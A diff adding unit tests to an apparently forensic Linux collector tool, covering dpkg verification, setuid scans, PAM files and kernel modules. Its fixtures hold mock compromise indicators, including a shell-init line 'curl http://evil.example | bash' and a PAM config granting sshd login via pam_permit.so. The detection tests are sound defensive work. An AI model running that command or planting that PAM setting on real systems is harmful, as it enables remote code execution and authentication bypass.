@@ -749,7 +749,7 @@ def test_user_collector_reads_from_source(tmp_path):
 
 def test_all_collectors_registered():
     from ubuntils.collectors import ALL_COLLECTORS
-    assert len(ALL_COLLECTORS) == 8
+    assert len(ALL_COLLECTORS) == 11
 
 
 def test_all_collectors_are_base_collector_subclasses():
@@ -782,3 +782,244 @@ def test_environment_collector_captures_shell_init_files(tmp_path):
     assert entry["source"] == "/home/alice/.bashrc"
     assert "curl http://evil.example | bash" in entry["content"]
     assert entry["ctime"] > 0
+
+
+def test_package_collector_parses_dpkg_verify(tmp_path):
+    from ubuntils.collectors.packages import PackageCollector
+    from ubuntils.collectors.source import BundleSource
+
+    cmds = tmp_path / "commands"
+    cmds.mkdir()
+    (cmds / "dpkg_verify.txt").write_text(
+        "??5?????? c /etc/ssh/sshd_config\n"
+        "missing   /usr/bin/sshd\n"
+        "....5..T. /usr/bin/passwd\n"
+    )
+    (cmds / "lsattr_sensitive.txt").write_text("")
+    (cmds / "find_setuid.txt").write_text("")
+    src = BundleSource(
+        root_dir=str(tmp_path / "files"),
+        command_index={
+            "dpkg_verify": str(cmds / "dpkg_verify.txt"),
+            "lsattr_sensitive": str(cmds / "lsattr_sensitive.txt"),
+            "find_setuid": str(cmds / "find_setuid.txt"),
+        },
+    )
+
+    result = PackageCollector(source=src).collect()
+
+    entries = result["dpkg_verify_entries"]
+    assert {"path": "/etc/ssh/sshd_config", "flags": "??5??????", "is_conffile": True, "missing": False} in entries
+    assert {"path": "/usr/bin/sshd", "flags": "", "is_conffile": False, "missing": True} in entries
+    assert {"path": "/usr/bin/passwd", "flags": "....5..T.", "is_conffile": False, "missing": False} in entries
+
+
+def test_package_collector_parses_lsattr_immutable_flags(tmp_path):
+    from ubuntils.collectors.packages import PackageCollector
+    from ubuntils.collectors.source import BundleSource
+
+    cmds = tmp_path / "commands"
+    cmds.mkdir()
+    (cmds / "dpkg_verify.txt").write_text("")
+    (cmds / "lsattr_sensitive.txt").write_text(
+        "----i--------e--- /etc/ld.so.preload\n"
+        "-------------e--- /etc/passwd\n"
+        "lsattr: No such file or directory - /etc/sudoers.d/custom\n"
+    )
+    (cmds / "find_setuid.txt").write_text("")
+    src = BundleSource(
+        root_dir=str(tmp_path / "files"),
+        command_index={
+            "dpkg_verify": str(cmds / "dpkg_verify.txt"),
+            "lsattr_sensitive": str(cmds / "lsattr_sensitive.txt"),
+            "find_setuid": str(cmds / "find_setuid.txt"),
+        },
+    )
+
+    result = PackageCollector(source=src).collect()
+
+    assert {"path": "/etc/ld.so.preload", "attrs": "----i--------e---"} in result["immutable_flags"]
+    assert {"path": "/etc/passwd", "attrs": "-------------e---"} in result["immutable_flags"]
+    assert len(result["immutable_flags"]) == 2  # the lsattr error line is skipped, not crashed on
+
+
+def test_package_collector_parses_setuid_binaries(tmp_path):
+    from ubuntils.collectors.packages import PackageCollector
+    from ubuntils.collectors.source import BundleSource
+
+    cmds = tmp_path / "commands"
+    cmds.mkdir()
+    (cmds / "dpkg_verify.txt").write_text("")
+    (cmds / "lsattr_sensitive.txt").write_text("")
+    (cmds / "find_setuid.txt").write_text(
+        "/usr/bin/sudo\n/usr/bin/passwd\n/tmp/.hidden/backdoor\n"
+    )
+    src = BundleSource(
+        root_dir=str(tmp_path / "files"),
+        command_index={
+            "dpkg_verify": str(cmds / "dpkg_verify.txt"),
+            "lsattr_sensitive": str(cmds / "lsattr_sensitive.txt"),
+            "find_setuid": str(cmds / "find_setuid.txt"),
+        },
+    )
+
+    result = PackageCollector(source=src).collect()
+
+    assert result["setuid_binaries"] == [
+        "/usr/bin/sudo", "/usr/bin/passwd", "/tmp/.hidden/backdoor"
+    ]
+    assert result["dpkg_verify_collection_failed"] is False
+    assert result["setuid_collection_failed"] is False
+
+
+class _SpySource:
+    """Minimal ArtifactSource stand-in that records every run() call's kwargs
+    so tests can assert PackageCollector passes non-default, generous timeouts
+    for the two slow commands (dpkg --verify, find_setuid) without depending
+    on those binaries actually existing or being slow on the test runner."""
+
+    def __init__(self, responses=None):
+        self.calls = []
+        self._responses = responses or {}
+
+    def run(self, name, argv, timeout=30):
+        self.calls.append({"name": name, "argv": argv, "timeout": timeout})
+        return self._responses.get(name, ("", "", 0))
+
+    def read_text(self, path):
+        raise OSError(path)
+
+    def read_bytes(self, path):
+        raise OSError(path)
+
+    def exists(self, path):
+        return False
+
+    def lstat(self, path):
+        raise OSError(path)
+
+    def glob(self, pattern):
+        return []
+
+
+def test_package_collector_uses_generous_non_default_timeouts_for_slow_commands():
+    from ubuntils.collectors.packages import (
+        PackageCollector, DPKG_VERIFY_TIMEOUT, FIND_SETUID_TIMEOUT,
+    )
+
+    src = _SpySource()
+    PackageCollector(source=src).collect()
+
+    calls_by_name = {c["name"]: c for c in src.calls}
+    assert calls_by_name["dpkg_verify"]["timeout"] == DPKG_VERIFY_TIMEOUT
+    assert calls_by_name["find_setuid"]["timeout"] == FIND_SETUID_TIMEOUT
+    # Both must be well above the ArtifactSource.run default of 30s.
+    assert DPKG_VERIFY_TIMEOUT > 30
+    assert FIND_SETUID_TIMEOUT > 30
+
+
+def test_package_collector_find_setuid_scans_setgid_and_attacker_drop_locations():
+    from ubuntils.collectors.packages import PackageCollector
+
+    src = _SpySource()
+    PackageCollector(source=src).collect()
+
+    calls_by_name = {c["name"]: c for c in src.calls}
+    argv = calls_by_name["find_setuid"]["argv"]
+    for path in ("/opt", "/home", "/srv", "/usr", "/bin", "/sbin", "/tmp", "/var/tmp", "/dev/shm"):
+        assert path in argv
+    assert "-2000" in argv  # setgid
+    assert "-4000" in argv  # setuid
+
+
+def test_package_collector_distinguishes_timeout_from_clean_empty_output():
+    from ubuntils.collectors.packages import PackageCollector
+
+    # rc == -1 is shell.run_command's convention for a timeout/OSError.
+    timed_out_src = _SpySource(responses={
+        "dpkg_verify": ("", "Command timed out after 600 seconds", -1),
+        "find_setuid": ("", "Command timed out after 300 seconds", -1),
+    })
+    result = PackageCollector(source=timed_out_src).collect()
+    assert result["dpkg_verify_entries"] == []
+    assert result["setuid_binaries"] == []
+    assert result["dpkg_verify_collection_failed"] is True
+    assert result["setuid_collection_failed"] is True
+
+    clean_src = _SpySource(responses={
+        "dpkg_verify": ("", "", 0),
+        "find_setuid": ("", "", 0),
+    })
+    clean_result = PackageCollector(source=clean_src).collect()
+    assert clean_result["dpkg_verify_entries"] == []
+    assert clean_result["setuid_binaries"] == []
+    assert clean_result["dpkg_verify_collection_failed"] is False
+    assert clean_result["setuid_collection_failed"] is False
+
+
+# ─── PamCollector ────────────────────────────────────────────────────────────
+
+def test_pam_collector_reads_pam_d_and_nsswitch(tmp_path):
+    from ubuntils.collectors.pam import PamCollector
+    from ubuntils.collectors.source import BundleSource
+
+    files = tmp_path / "files"
+    (files / "etc" / "pam.d").mkdir(parents=True)
+    (files / "etc" / "pam.d" / "sshd").write_text("auth sufficient pam_permit.so\n")
+    (files / "etc" / "pam.d" / "common-auth").write_text("auth required pam_unix.so nullok\n")
+    (files / "etc" / "nsswitch.conf").write_text("passwd: files systemd\n")
+
+    src = BundleSource(root_dir=str(files), command_index={})
+    result = PamCollector(source=src).collect()
+
+    paths = {f["path"] for f in result["pam_files"]}
+    assert paths == {"/etc/pam.d/sshd", "/etc/pam.d/common-auth"}
+    sshd_entry = next(f for f in result["pam_files"] if f["path"] == "/etc/pam.d/sshd")
+    assert "pam_permit.so" in sshd_entry["content"]
+    assert result["nsswitch_content"] == "passwd: files systemd\n"
+
+
+def test_pam_collector_preserves_partial_results_when_a_later_file_read_raises():
+    from ubuntils.collectors.pam import PamCollector
+
+    class _FlakySource:
+        def glob(self, pattern):
+            return ["/etc/pam.d/sshd", "/etc/pam.d/common-auth"]
+
+        def read_text(self, path):
+            if path == "/etc/pam.d/sshd":
+                return "auth sufficient pam_permit.so\n"
+            if path == "/etc/pam.d/common-auth":
+                # A non-OSError/ValueError failure on the SECOND file must not
+                # discard the first file's already-read content.
+                raise RuntimeError("unexpected failure reading " + path)
+            return ""  # /etc/nsswitch.conf — unrelated to this test
+
+    result = PamCollector(source=_FlakySource()).collect()
+
+    paths = {f["path"] for f in result["pam_files"]}
+    assert paths == {"/etc/pam.d/sshd"}
+
+
+# ─── KernelCollector ─────────────────────────────────────────────────────────
+
+def test_kernel_collector_parses_lsmod(tmp_path):
+    from ubuntils.collectors.kernel import KernelCollector
+    from ubuntils.collectors.source import BundleSource
+
+    cmds = tmp_path / "commands"
+    cmds.mkdir()
+    (cmds / "lsmod.txt").write_text(
+        "Module                  Size  Used by\n"
+        "xt_conntrack           16384  1 iptable_filter\n"
+        "evil_rootkit           12288  0\n"
+    )
+    src = BundleSource(root_dir=str(tmp_path / "files"),
+                        command_index={"lsmod": str(cmds / "lsmod.txt")})
+
+    result = KernelCollector(source=src).collect()
+    names = [m["name"] for m in result["kernel_modules"]]
+
+    assert names == ["xt_conntrack", "evil_rootkit"]
+    xt = next(m for m in result["kernel_modules"] if m["name"] == "xt_conntrack")
+    assert xt["used_by"] == ["iptable_filter"]
